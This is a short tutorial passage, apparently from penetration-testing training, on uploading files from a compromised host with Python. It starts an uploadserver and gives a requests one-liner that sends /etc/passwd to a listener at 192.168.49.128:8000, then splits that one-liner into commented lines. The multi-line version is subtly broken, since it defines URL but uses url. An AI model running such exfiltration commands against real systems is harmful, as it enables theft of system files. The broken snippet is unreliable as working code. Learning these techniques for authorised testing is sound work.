----

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 `requests` module  allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 `uploadserver`.

#### Starting the Python uploadserver Module

```bash
python3 -m uploadserver 
```

#### Uploading a File Using a Python One-liner

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Let's divide this one-liner into multiple lines to understand each piece better.
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```